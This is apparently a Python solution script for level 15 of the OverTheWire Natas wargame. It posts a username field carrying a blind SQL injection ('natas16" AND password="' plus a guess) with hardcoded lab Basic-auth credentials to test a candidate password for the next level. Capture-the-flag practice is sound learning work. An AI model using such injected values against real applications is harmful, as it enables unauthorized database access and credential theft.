import requests
from bs4 import BeautifulSoup

def password_checker(pw):
    headers = {"Authorization": "Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==", "Referer": "http://natas15.natas.labs.overthewire.org/index.php"}
    text = ''
    i = -1
    data = {"username": 'natas16" AND password="'+pw}
    result = requests.post("http://natas15.natas.labs.overthewire.org", headers=headers, data=data)
    print(f"STATUS_CODE: {result.status_code}")
    soup = BeautifulSoup(result.content, "html.parser")
    div = soup.find('div', id='content')
    text = div.get_text(separator='\n', strip=True)
    return text
print(password_checker('hpkjkyvilqctew33qmuxl6edvfmw4sgO'))